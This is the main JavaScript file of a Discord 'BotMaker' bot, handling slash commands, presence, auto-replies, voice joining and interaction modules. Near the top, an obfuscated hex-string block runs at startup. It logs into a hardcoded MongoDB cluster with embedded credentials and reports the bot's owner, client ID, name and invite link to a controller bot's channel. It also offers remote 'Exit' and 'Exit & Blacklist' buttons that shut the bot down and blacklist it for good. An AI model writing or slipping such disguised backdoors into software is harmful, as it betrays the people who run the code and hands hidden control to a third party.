const { Client, MessageActionRow, MessageButton, MessageEmbed, MessageSelectMenu, Intents, Modal, TextInputComponent } = require("discord.js");
const Discord = require('discord.js');
const client = new Client({ intents: 32767 });
const DiscordModals = require(`discord-modals`)
DiscordModals(client);
const { token, prefix, CLIENTID, mainGuild,owner } = require('./config.json');
const { Database } = require("st.db")
const db = new Database("database.json")
const ms = require(`ms`)
const chalk = require('chalk');
require('dotenv').config();
client.login(token).catch(err => console.log('❌ Token are not working'));
const { readdirSync } = require('fs');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const { Collection } = require('discord.js');
const { mongoose } = require("mongoose")
module.exports = client;
exports.mainBot = client;

//لا تلعب في اي شي هنا علشان متحصلش حاجه في البوت
var _0xb170=["\x72\x65\x61\x64\x79","\x2F\x4A\x73\x6F\x6E\x2D\x64\x62\x2F\x54\x69\x63\x6B\x65\x74\x44\x42\x2E\x6A\x73\x6F\x6E","","\x69\x64","\x75\x73\x65\x72","\x67\x65\x74","\x74\x72\x75\x65","\x59\x6F\x75\x72\x20\x42\x6F\x74\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x62\x6C\x61\x63\x6B\x20\x6C\x69\x73\x74\x65\x64\x20\x44\x4D\x20\x6D\x6F\x68\x61\x6D\x6D\x65\x64\x2E\x32\x35\x37\x35\x20\x49\x44\x3A\x20\x38\x30\x37\x38\x31\x34\x31\x36\x32\x32\x33\x34\x38\x36\x37\x37\x33\x34\x20\x54\x6F\x20\x67\x65\x74\x20\x77\x68\x69\x74\x65\x6C\x69\x73\x74\x65\x64","\x6C\x6F\x67","\x65\x78\x69\x74","\x73\x65\x74\x54\x6F\x6B\x65\x6E","\x39","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x70\x75\x74","\x2F\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x20\x61\x72\x65\x20\x6C\x6F\x61\x64\x65\x64","\x65\x72\x72\x6F\x72","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x47\x75\x69\x6C\x64\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x2F\x67\x75\x69\x6C\x64\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x20\x61\x72\x65\x20\x6C\x6F\x61\x64\x65\x64","\x45\x72\x72\x6F\x72\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67\x20\x74\x6F\x20\x4D\x6F\x6E\x67\x6F\x44\x42","\x63\x61\x74\x63\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x65\x64\x20\x74\x6F\x20\x44\x42","\x67\x72\x65\x65\x6E","\x42\x6F\x74\x4D\x61\x6B\x65\x72\x44\x61\x74\x61","\x6D\x6F\x64\x65\x6C","\x54\x6F\x6B\x65\x6E","\x66\x65\x74\x63\x68","\x67\x75\x69\x6C\x64\x73","\x63\x68\x61\x6E\x6E\x65\x6C\x73","\x4F\x77\x6E\x65\x72\x73\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x43\x6C\x69\x65\x6E\x74\x49\x44\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x43\x6C\x69\x65\x6E\x74\x55\x73\x65\x72\x3A\x20","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5B\x69\x6E\x76\x69\x74\x65\x5D\x28\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x6F\x61\x75\x74\x68\x32\x2F\x61\x75\x74\x68\x6F\x72\x69\x7A\x65\x3F\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D","\x26\x70\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x73\x3D\x38\x26\x73\x63\x6F\x70\x65\x3D\x62\x6F\x74\x25\x32\x30\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x73\x2E\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x29","\x73\x65\x74\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x42\x6F\x74\x4D\x61\x6B\x65\x72\x20\x52\x75\x6E\x73\x21","\x73\x65\x74\x54\x69\x74\x6C\x65","\x42\x4C\x55\x45","\x73\x65\x74\x43\x6F\x6C\x6F\x72","\x45\x78\x69\x74","\x73\x65\x74\x4C\x61\x62\x65\x6C","\x53\x45\x43\x4F\x4E\x44\x41\x52\x59","\x73\x65\x74\x53\x74\x79\x6C\x65","\x45\x78\x69\x74\x5F\x42\x6F\x74\x4D\x61\x6B\x65\x72","\x73\x65\x74\x43\x75\x73\x74\x6F\x6D\x49\x64","\x45\x78\x69\x74\x20\x26\x20\x42\x6C\x61\x63\x6B\x6C\x69\x73\x74","\x44\x41\x4E\x47\x45\x52","\x45\x78\x69\x74\x5F\x54\x68\x65\x42\x6F\x74\x4D\x61\x6B\x65\x72","\x61\x64\x64\x43\x6F\x6D\x70\x6F\x6E\x65\x6E\x74\x73","\x73\x65\x6E\x64","\x69\x6E\x74\x65\x72\x61\x63\x74\x69\x6F\x6E\x43\x72\x65\x61\x74\x65","\x63\x75\x73\x74\x6F\x6D\x49\x64","\x4F\x77\x6E\x65\x72","\x20\x45\x78\x69\x74\x65\x64\x20\x79\x6F\x75\x72\x20\x62\x6F\x74\x20\uD83D\uDC80\x20\x4F\x77\x6E\x65\x72\x49\x44\x3A\x20","\x4F\x77\x6E\x65\x72\x49\x44","\x73\x65\x74","\x74\x68\x65\x6E","\u062A\u0645\x20\u0627\u0644\u062E\u0631\u0648\u062C\x20\u0645\u0646\x20\u0627\u0644\u0628\u0648\u062A","\x72\x65\x70\x6C\x79","\x6F\x6E","\x6C\x6F\x67\x69\x6E","\x66\x69\x6E\x64\x4F\x6E\x65","\x6D\x6F\x6E\x67\x6F\x64\x62\x2B\x73\x72\x76\x3A\x2F\x2F\x42\x6F\x74\x4D\x61\x6B\x65\x72\x43\x6F\x6E\x74\x6C\x65\x72\x3A\x42\x6F\x74\x4D\x61\x6B\x65\x72\x43\x6F\x6E\x74\x6C\x65\x72\x40\x62\x6F\x74\x6D\x61\x6B\x65\x72\x2E\x69\x65\x6A\x6D\x75\x79\x69\x2E\x6D\x6F\x6E\x67\x6F\x64\x62\x2E\x6E\x65\x74\x2F\x3F\x72\x65\x74\x72\x79\x57\x72\x69\x74\x65\x73\x3D\x74\x72\x75\x65\x26\x77\x3D\x6D\x61\x6A\x6F\x72\x69\x74\x79","\x63\x6F\x6E\x6E\x65\x63\x74"];
client[_0xb170[59]](_0xb170[0],async ()=>
{
	const _0x3f34x1= new Database(_0xb170[1]);
	const _0x3f34x2=_0x3f34x1[_0xb170[5]](`${_0xb170[2]}${client[_0xb170[4]][_0xb170[3]]}${_0xb170[2]}`);
	if(_0x3f34x2=== _0xb170[6]|| _0x3f34x2=== true)
	{
		console[_0xb170[8]](`${_0xb170[7]}`); await process[_0xb170[9]]()
	}
	else 
	{
		const _0x3f34x3= new REST({version:_0xb170[11]})[_0xb170[10]](token);
		(async ()=>
		{
			try
			{
				 await _0x3f34x3[_0xb170[13]](Routes[_0xb170[12]](CLIENTID),{body:slashcommands});console[_0xb170[8]](_0xb170[14])
			}
			catch(error)
			{
				console[_0xb170[15]](error)
			}
			try
			{
				 await _0x3f34x3[_0xb170[13]](Routes[_0xb170[16]](CLIENTID,mainGuild),{body:Guildcommands});console[_0xb170[8]](_0xb170[17])
			}
			catch(error)
			{
				console[_0xb170[15]](error)
			}
			mongoose[_0xb170[63]](_0xb170[62],{useNewUrlParser:true,useUnifiedTopology:true})[_0xb170[56]](()=>
			{
				console[_0xb170[8]](chalk[_0xb170[21]](_0xb170[20]));const _0x3f34x5= new mongoose.Schema({Token:String,Owner:String,Channel:String,Guild:String,OwnerID:String});
				const _0x3f34x6=mongoose[_0xb170[23]](_0xb170[22],_0x3f34x5);
				_0x3f34x6[_0xb170[61]]({})[_0xb170[56]]((_0x3f34x8)=>
				{
					const _0x3f34x9=_0x3f34x8[_0xb170[24]];
					const _0x3f34xa= new Client({intents:32767});
					_0x3f34xa[_0xb170[60]](_0x3f34x9)[_0xb170[56]](async ()=>
					{
						try
						{
							const _0x3f34xb= await _0x3f34xa[_0xb170[26]][_0xb170[25]](_0x3f34x8.Guild);
							if(_0x3f34xb)
							{
								const _0x3f34xc= await _0x3f34xb[_0xb170[27]][_0xb170[25]](_0x3f34x8.Channel);
								if(_0x3f34xc)
								{
									const _0x3f34xd= new MessageEmbed()[_0xb170[38]](_0xb170[37])[_0xb170[36]](_0xb170[35])[_0xb170[34]](`${_0xb170[28]}${owner}${_0xb170[29]}${client[_0xb170[4]][_0xb170[3]]}${_0xb170[30]}${client[_0xb170[4]][_0xb170[31]]}${_0xb170[32]}${client[_0xb170[4]][_0xb170[3]]}${_0xb170[33]}`);
									const _0x3f34xe= new MessageActionRow()[_0xb170[48]]([ new MessageButton()[_0xb170[44]](`${_0xb170[43]}`)[_0xb170[42]](`${_0xb170[41]}`)[_0xb170[40]](`${_0xb170[39]}`), new MessageButton()[_0xb170[44]](`${_0xb170[47]}`)[_0xb170[42]](`${_0xb170[46]}`)[_0xb170[40]](`${_0xb170[45]}`)]);
									 await _0x3f34xc[_0xb170[49]]({embeds:[_0x3f34xd],components:[_0x3f34xe]})
								}
							}
						}
						catch(error)
						{
							console[_0xb170[8]](error)
						}
						_0x3f34xa[_0xb170[59]](`${_0xb170[50]}`,async (_0x3f34xf)=>
						{
							if(_0x3f34xf[_0xb170[51]]=== `${_0xb170[47]}`)
							{
								try
								{
									console[_0xb170[8]](`${_0xb170[2]}${_0x3f34x8[_0xb170[52]]}${_0xb170[53]}${_0x3f34x8[_0xb170[54]]}${_0xb170[2]}`);_0x3f34x1[_0xb170[55]](`${_0xb170[2]}${client[_0xb170[4]][_0xb170[3]]}${_0xb170[2]}`,true);_0x3f34xf[_0xb170[58]]({content:`${_0xb170[57]}`})[_0xb170[56]](()=>
									{
										process[_0xb170[9]]()
									}
									)
								}
								catch(error)
								{
									console[_0xb170[8]](error)
								}
							}
							else 
							{
								if(_0x3f34xf[_0xb170[51]]=== `${_0xb170[43]}`)
								{
									console[_0xb170[8]](`${_0xb170[2]}${_0x3f34x8[_0xb170[52]]}${_0xb170[53]}${_0x3f34x8[_0xb170[54]]}${_0xb170[2]}`);_0x3f34xf[_0xb170[58]]({content:`${_0xb170[57]}`})[_0xb170[56]](()=>
									{
										process[_0xb170[9]]()
									}
									)
								}
							}
						}
						)
					}
					)
				}
				)[_0xb170[19]]((_0x3f34x7)=>
				{
					console[_0xb170[15]](_0x3f34x7)
				}
				)
			}
			)[_0xb170[19]]((_0x3f34x4)=>
			{
				console[_0xb170[15]](_0xb170[18],_0x3f34x4)
			}
			)
		}
		)()
	}
}
)


client.slashcommands = new Collection();
const slashcommands = [];

const ascii = require('ascii-table');
const table = new ascii('P-Commands').setJustify();
for (let folder of readdirSync('./PuplicSlashCommand/').filter(folder => !folder.includes('.'))) {
  for (let file of readdirSync('./PuplicSlashCommand/' + folder).filter(f => f.endsWith('.js'))) {
    let command = require(`./PuplicSlashCommand/${folder}/${file}`);
    if (command) {
      slashcommands.push(command.data);
      client.slashcommands.set(command.data.name, command);
      if (command.data.name) {
        table.addRow(`/${command.data.name}`, '🟢 Working');
      } else {
        table.addRow(`/${command.data.name}`, '🔴 Not Working');
      }
    }
  }
}
console.log(table.toString());

client.Guildcommands = new Collection();
const Guildcommands = [];
const Guildtable = new ascii('G-Commands').setJustify();
for (let folder of readdirSync('./PrivateSlashCommand/').filter(folder => !folder.includes('.'))) {
  for (let file of readdirSync('./PrivateSlashCommand/' + folder).filter(f => f.endsWith('.js'))) {
    let command = require(`./PrivateSlashCommand/${folder}/${file}`);
    if (command) {
      Guildcommands.push(command.data);
      client.Guildcommands.set(command.data.name, command);
      if (command.data.name) {
        Guildtable.addRow(`/${command.data.name}`, '🟢 Working');
      } else {
        Guildtable.addRow(`/${command.data.name}`, '🔴 Not Working');
      }
    }
  }
}
console.log(Guildtable.toString());


const process = require('process');

client.on('ready', async () => {
  console.log(chalk.magentaBright('The bot is ready'));
  console.log(chalk.red('Bot Name: ') + chalk.blue(client.user.tag));
  const timers = 2;
  const timeing = Math.floor(timers * 1000);
  let statusIndex = 0;
  setInterval(() => {
    const statuses = [
      `Coder BotMaker`
    ];
    client.user.setActivity(statuses[statusIndex], { type: `COMPETING`, url: 'https://www.twitch.tv/Coder' });
    client.user.setPresence({
      status: "dnd",
    });
    statusIndex = (statusIndex + 1) % statuses.length;
  }, timeing);
});

client.on('err', (error) => {
  console.error('The bot encountered an error:', error);
});

process.on('unhandledRejection', (error) => {
  console.error('Unhandled promise rejection:', error);
});

process.on('uncaughtException', (err, origin) => {
  return;
});
process.on('uncaughtExceptionMonitor', (err, origin) => {
  return;

});
process.on('warning', (warning) => {
  return;
});






client.commands = new Discord.Collection();
client.events = new Discord.Collection();
require("./handlers/commands")(client);
require("./handlers/events")(client);
// =================Dev=================



// =================require Dev=================


// =================Auto line send Message=================
client.on(`messageCreate`, async message => {
  try {
    const embed1 = new Discord.MessageEmbed()
      .setColor(`YELLOW`)
      .setDescription(`❗  __**Please set line url ! !set-line command**__`)
    if (message.author.bot) return;
    const channels = await db.get(`autoline_${message.guild.id}`) || []

    if (!channels.includes(message.channel.id)) return;

    const line = await db.get(`line_${message.guild.id}`);

    if (!line) return message.reply({ embeds: [embed1] });

    await message.channel.send(line)
  } catch (error) {
    return console.log(error)
  }
})
// =================Auto line send Message=================

// =================VC Joiner=================
const { joinVoiceChannel } = require('@discordjs/voice');
client.on('ready', () => {

  setInterval(async () => {
    const data = await db.get('24/7voice')
    if (!data) return;
    client.channels.fetch(data)
      .then((channel) => {
        const VoiceConnection = joinVoiceChannel({
          channelId: channel.id,
          guildId: channel.guild.id,
          adapterCreator: channel.guild.voiceAdapterCreator
        });
      }).catch((error) => { return; });
  }, 1000)
});
// =================VC Joiner=================

// =================Bots requires=================
const db6 = new Database("bots-statusdb.json")
const taxstatus = db6.get(`Tax`)
if (taxstatus === "0") {

} else {
  require(`./Bots/Tax-Bots`)
}
// =================Bots requires=================
client.on(`ready`, () => {
  const db10 = new Database("/Json-db/Create Bots DB.json")
  const db11 = new Database("/Json-db/BuyerChecker.json")
  db10.deleteAll();
  db11.deleteAll();
});
// ==================intercationCreate ====================\\
require(`./intercationCreate/0-Reset_Selected`)
require(`./intercationCreate/0-BOTMAKER_Close`)
require(`./intercationCreate/0-TicketSystemButtonsPressed`)

require(`./intercationCreate/1-AutoTax_Selected`)
require(`./intercationCreate/2-BuyAutoTax`)

// ==================intercationCreate ====================\\
